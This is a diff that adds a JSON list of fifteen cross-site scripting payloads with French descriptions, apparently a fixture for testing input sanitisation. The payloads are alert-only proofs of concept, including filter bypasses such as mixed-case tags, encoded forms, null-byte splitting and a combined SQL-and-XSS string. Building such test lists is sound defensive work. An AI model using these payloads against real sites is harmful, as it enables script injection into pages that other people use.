@@ -1,0 +1,79 @@
+{
+  "payloads": [
+    {
+      "id": "XSS-01",
+      "description": "Script basique alert",
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "id": "XSS-02",
+      "description": "Image onerror",
+      "payload": "<​img src=x onerror=alert('XSS')>"
+    },
+    {
+      "id": "XSS-03",
+      "description": "SVG onload",
+      "payload": "<​svg onload=alert('XSS')>"
+    },
+    {
+      "id": "XSS-04",
+      "description": "Javascript URI",
+      "payload": "javascript:alert('XSS')"
+    },
+    {
+      "id": "XSS-05",
+      "description": "Encodage HTML entities",
+      "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;"
+    },
+    {
+      "id": "XSS-06",
+      "description": "Double encodage URL",
+      "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E"
+    },
+    {
+      "id": "XSS-07",
+      "description": "Event handler onfocus",
+      "payload": "<​input autofocus onfocus=alert('XSS')>"
+    },
+    {
+      "id": "XSS-08",
+      "description": "Iframe src javascript",
+      "payload": "<iframe src=javascript:alert('XSS')></iframe>"
+    },
+    {
+      "id": "XSS-09",
+      "description": "Body onload",
+      "payload": "<​body onload=alert('XSS')>"
+    },
+    {
+      "id": "XSS-10",
+      "description": "Contournement filtre majuscules",
+      "payload": "<ScRiPt>alert('XSS')</ScRiPt>"
+    },
+    {
+      "id": "XSS-11",
+      "description": "Attribut style expression (IE)",
+      "payload": "<​div style=\"width:expression(alert('XSS'))\">"
+    },
+    {
+      "id": "XSS-12",
+      "description": "Template literal injection",
+      "payload": "${alert('XSS')}"
+    },
+    {
+      "id": "XSS-13",
+      "description": "SQL + XSS combiné",
+      "payload": "' OR 1=1; <script>alert('XSS')</script>"
+    },
+    {
+      "id": "XSS-14",
+      "description": "Null byte bypass",
+      "payload": "<scr\u0000ipt>alert('XSS')</scr\u0000ipt>"
+    },
+    {
+      "id": "XSS-15",
+      "description": "DOM clobber via hash",
+      "payload": "#<img src=x onerror=alert('XSS')>"
+    }
+  ]
+}
